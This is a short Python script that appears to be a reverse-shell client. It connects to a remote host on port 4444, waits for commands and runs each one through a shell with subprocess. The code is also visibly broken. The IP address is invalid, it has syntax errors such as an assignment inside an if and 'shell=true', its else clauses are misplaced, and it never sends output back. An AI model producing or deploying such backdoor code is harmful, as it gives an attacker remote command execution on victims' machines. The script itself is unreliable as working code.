

import socket
import subprocess 
import time 

s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

host = "192.0.0.0.0"
port = 4444

for i in range (20):
    try :
      s.connect((host,port))
      break
    except:
        time.sleep(5)

while True:
     data = s.recv(1024)
     if data != "":
         if data = str(data,"utf-8"):
             if data == "exit":
                 break
else :
    proc = subprocess.Popen(data , shell=true,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)  
    output = proc.stdout.read()+proc.stderr.read()

else: break

s.close()                  

        



